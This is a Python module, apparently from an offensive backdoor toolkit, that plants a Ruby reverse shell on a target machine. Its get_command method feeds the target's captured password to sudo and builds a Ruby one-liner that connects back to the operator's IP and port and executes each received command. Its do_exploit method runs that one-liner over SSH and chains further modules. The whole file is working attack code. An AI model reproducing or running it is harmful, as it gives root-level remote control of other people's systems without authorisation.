from backdoors.backdoor import * 
import time

class Ruby(Backdoor):
	prompt = Fore.RED + "(rb) " + Fore.BLUE + ">> " + Fore.RESET 
	
	def __init__(self, core):
		cmd.Cmd.__init__(self)
		self.intro = GOOD + "Using Ruby module..."
		self.core = core
		self.options = {
				"port"   : Option("port", 53937, "port to connect to", True),
				}
		self.modules = {}
		self.allow_modules = True
		self.help_text = INFO + "Uses ruby to open a socket and redirect I/O to /bin/sh."

	def get_command(self):
		command = "echo " + self.core.curtarget.pword + " | sudo -S ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + self.core.localIP + "\",\"" + str(self.get_value("port")) + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){ |io| c.print io.read } end'"
		print(command)
		return command

	def do_exploit(self, args):
		print(GOOD + "Initializing backdoor...")
		self.listen(prompt="none")
		self.core.curtarget.ssh.exec_command(self.get_command())
		print(GOOD + "Ruby backdoor on " + str(self.get_value("port")) + " attempted.")

		for mod in self.modules.keys():
			print(INFO + "Attempting to execute " + mod.name + " module...")
			mod.exploit()